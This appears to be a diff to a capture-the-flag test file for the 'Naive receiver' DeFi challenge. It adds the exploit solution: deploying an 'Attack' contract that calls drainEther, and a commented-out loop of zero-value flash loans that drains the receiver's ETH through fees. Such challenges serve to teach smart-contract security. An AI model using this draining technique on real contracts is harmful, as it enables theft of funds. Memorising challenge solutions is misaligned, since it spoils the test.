@@ -19,22 +19,36 @@ describe('[Challenge] Naive receiver', function () {
 
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
+
         expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
         expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
 
         this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
+
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
+
+        //In single transaction
+
+        const AttackFactory = await ethers.getContractFactory("Attack", attacker)
+        const attack = await AttackFactory.deploy()
+        await attack.connect(attacker).drainEther(this.receiver.address, this.pool.address)
+
+
+        // In multiple transaction
+
+        // for (let i = 0; i < 10; i++) {
+        //     await this.pool.connect(attacker).flashLoan(this.receiver.address, 0)
+        // }
+
 
         // All ETH has been drained from the receiver
         expect(
